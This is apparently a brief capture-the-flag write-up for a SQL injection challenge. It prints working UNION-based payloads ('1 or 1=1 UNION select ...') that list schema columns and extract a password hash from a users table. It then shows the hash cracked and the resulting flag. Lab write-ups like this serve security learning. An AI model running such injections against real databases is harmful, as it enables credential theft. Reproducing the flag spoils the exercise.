## SQL_injection: member

### Definition


### Problem



### Solution



### FLAG

After getting all table names and their column names, we notice the existence of an `users` table with the following columns;

`user_id` `first_name` `last_name` `town` `country` `planet` `commentaire` `countersign`

After injecting the following query: `1 or 1=1 UNION select commentaire, countersign FROM users`,
we found a hidden note (`Decrypt this password -> then lower all the char. Sh256 on it and it's good !`),
within the comments column.

the password was `5ff9d0165b4f92b14994e5c685cdce28`, after decrypting it we get `FortyTwo`

`FortyTwo` =(lowercase)=> `fortytwo` =(Sh256)=> `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5` Ta-Duh!!!

## Links

* []() -- 

## Notes

 * the QUERY we inject to get table names AND their column names in all databases from the SQL Server;

`
1 or 1=1 UNION select table_name, column_name FROM information_schema.columns
`
